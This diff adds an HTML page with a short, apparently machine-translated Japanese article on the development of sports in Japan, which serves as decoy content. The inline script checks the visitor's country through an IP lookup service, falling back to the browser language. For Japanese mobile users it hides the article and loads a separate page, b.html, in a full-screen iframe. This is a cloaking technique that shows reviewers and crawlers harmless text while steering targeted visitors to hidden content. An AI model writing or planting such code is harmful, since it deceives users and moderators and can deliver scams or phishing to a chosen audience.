@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>日本のスポーツの発展</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            color: #333;
+        }
+        header {
+            background: #007bff;
+            color: #fff;
+            padding: 20px 0;
+            text-align: center;
+        }
+        h1 {
+            margin: 0;
+        }
+        section {
+            padding: 20px;
+            max-width: 800px;
+            margin: auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .content {
+            display: block;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div id="content" class="content">
+    <header>
+        <h1>日本のスポーツの発展</h1>
+    </header>
+
+    <section>
+        <p>日本スポーツの発展は、文化、社会、テクノロジーの影響を大きく受けています。19世紀以来、日本はサッカー、バスケットボール、陸上競技などの西洋スポーツを積極的に導入し、多様なスポーツ文化を形成してきました。特に1990年代以降は、全民健身運動の推進により、ますます多くの人々がスポーツ活動に参加し、健康的なライフスタイルの普及が進んでいます。</p>
+        
+        <p>日本はまた、青少年スポーツ教育にも力を入れており、学校の体育課程や地域活動を通じて、子どもたちのチームワーク精神や競争意識を育てています。さらに、政府や企業はスポーツインフラの整備に多くの資源を投入し、各種スポーツイベントに良好な条件を提供しています。</p>
+    </section>
+</div>
+
+<script>
+    function isMobileDevice() {
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    function isJapaneseLanguage() {
+        const language = navigator.language || navigator.userLanguage;
+        return language.startsWith('ja');
+    }
+
+    fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => { 
+            if (data.country === 'JP' && isMobileDevice()) {
+                document.getElementById('content').classList.add('hidden');
+                var iframe = document.createElement('iframe');
+                iframe.src = 'b.html';
+                iframe.style.width = '100%';
+                iframe.style.height = '100vh';
+                iframe.style.border = 'none';
+                document.body.appendChild(iframe);
+                return;
+            }
+        })
+        .catch(error => {
+            console.error('Error fetching IP data:', error);
+            if (isJapaneseLanguage() && isMobileDevice()) {
+                document.getElementById('content').classList.add('hidden');
+                var iframe = document.createElement('iframe');
+                iframe.src = 'b.html';
+                iframe.style.width = '100%';
+                iframe.style.height = '100vh';
+                iframe.style.border = 'none';
+                document.body.appendChild(iframe);
+                return;
+            }
+        });
+</script>
+
+</body>
+</html>
